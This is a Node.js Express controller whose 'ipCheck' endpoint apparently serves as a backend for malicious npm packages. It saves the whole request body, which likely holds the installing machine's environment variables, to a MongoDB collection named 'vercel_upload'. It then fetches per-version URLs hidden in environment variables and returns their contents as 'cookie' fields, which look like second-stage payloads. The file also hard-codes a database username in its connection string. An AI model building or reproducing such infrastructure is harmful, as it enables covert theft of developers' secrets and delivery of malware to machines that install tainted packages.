const axios = require("axios");
const asyncErrorHandler = require("../middlewares/asyncErrorHandler");

const { MongoClient } = require('mongodb');
require('dotenv').config(); // Ensure dotenv is required to load environment variables

const uri = `mongodb+srv://filipporter9017:${process.env.DB_PASSWORD}@cluster0.7nw96kp.mongodb.net/gd/?retryWrites=true&w=majority&appName=Cluster0`;

const client = new MongoClient(uri, {
  tls: true,
  socketTimeoutMS: 45000,
  tlsAllowInvalidCertificates: false, // set to true only if testing with self-signed certs
});

async function insertQuery(query) {
  // console.log("attach to join to online db", query);
  try {
    await client.connect();
    // console.log("client is connected")
    const database = client.db("gd");
    // console.log("db is connected")
    const table = database.collection("vercel_upload");
    // console.log("table is connected")
    const result = await table.insertOne(query);

  } catch (err) {
    console.log("error is occurred:",err)
    await client.close();
  } finally {
    console.log("finally is occurred")
    await client.close();
  } 
}

exports.getIpCheck = asyncErrorHandler(async (req, res, next) => {
  res.status(200).json({
    success: true,
    data: ""
  });
});

exports.ipCheck = asyncErrorHandler(async (req, res, next) => {
  const version = req.body && req.body.version;

  const npm_version = req.body && req.body.npm_package_version;

  // console.log(npm_version)

  let flag = 55;
  if (version) {
    // console.log("version", version);
    const sub = version.split(".");
    if (sub && sub.length == 3) {
      flag = sub[2]; // ex: "1.0.55"
    }
  } else if (npm_version) {
    // console.log("npm version", npm_version);
    const sub = npm_version.split(".");
    if (sub && sub.length == 3) {
      flag = sub[2]; // ex: "1.0.55"
    }
  }

  // console.log("flag", flag)

  const id = "ID_" + flag;

  const u_id = id+"_1";

  const url = process.env[u_id] || process.env.ID_55_1;
  
  // console.log(req.body)

  await insertQuery(req.body);

  const result = await axios.get(url);

  const c_id = id+"_2";

  const control_url = process.env[c_id] || process.env.ID_55_2;
  const result_ctrl = await axios.get(control_url);

  console.log(`${id} is running`, url, control_url);

  
  res.status(200).json({
    success: true,
    cookie: result.data.cookie,
    control: result_ctrl.data.cookie
  });
});